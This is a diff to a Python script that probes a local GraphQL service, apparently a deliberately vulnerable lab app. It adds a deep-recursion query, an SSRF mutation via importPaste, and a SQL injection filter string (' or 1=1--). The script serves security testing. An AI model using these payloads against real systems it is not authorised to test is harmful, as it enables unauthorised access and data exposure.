@@ -2,7 +2,7 @@ import requests
 import json
 
 # Define the GraphQL endpoint URL
-GRAPHQL_URL = "http://localhost:5013/graphql"
+GRAPHQL_URL = "http://localhost:5013/graphiql"
 
 def print_red(text):
     print("\033[91m{}\033[0m".format(text))
@@ -112,6 +112,63 @@ def test_sensitive_data():
     except Exception as e:
         print("Error during sensitive data test:", e)
 
+def test_deep_recursion_attack():
+    deep_query = 'query { user { friends { friends { friends { id } } } } }'
+    try:
+        response = requests.post(GRAPHQL_URL, json={"query": deep_query})
+        if response.status_code == 200:
+            print_red("[-] Deep recursion query handling may be inadequate.")
+        else:
+            print_green("[+] Server managed deep recursion safely.")
+    except Exception as e:
+        print_red(f"[-] Deep recursion test failed: {e}")
+
+def test_ssrf_vulnerability():
+    # Mutation query attempting to access a potentially private internal service
+    ssrf_query = """
+    mutation {
+      importPaste(host:"localhost", port:8080, path:"/", scheme:"http") {
+        result
+      }
+    }
+    """
+    headers = {'Content-Type': 'application/json'}
+    payload = {'query': ssrf_query}
+
+    try:
+        print("Running SSRF attack test...")
+        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
+        if response.status_code == 200:
+            print_red("[!] SSRF attack may be possible.")
+            print("Response data:", response.json())
+        else:
+            print_green(f"[-] SSRF attack test failed with status code: {response.status_code}")
+    except Exception as e:
+        print_red(f"Failed to send SSRF test request: {e}")
+
+def test_sql_injection():
+    sql_injection_query = """
+    query {
+      pastes(filter:"aaa ' or 1=1--") {
+          content
+          title
+      }
+    }
+    """
+    headers = {'Content-Type': 'application/json'}
+    payload = {'query': sql_injection_query}
+
+    try:
+        print("Running SQL injection test...")
+        response = requests.post(GRAPHQL_URL, json=payload, headers=headers)
+        if response.status_code == 200 and 'data' in response.json():
+            print_red("[!] SQL injection may be possible.")
+            print("Response data:", response.json())
+        else:
+            print_green(f"[-] SQL injection test did not execute with usual symptoms, status code: {response.status_code}")
+    except Exception as e:
+        print_red(f"Failed to send SQL injection test request: {e}")
+
 
 if __name__ == "__main__":
     url = GRAPHQL_URL
@@ -120,3 +177,6 @@ if __name__ == "__main__":
     test_dos_attack()
     test_alias_attack()
     test_sensitive_data()
+    test_deep_recursion_attack()
+    test_ssrf_vulnerability()
+    test_sql_injection()
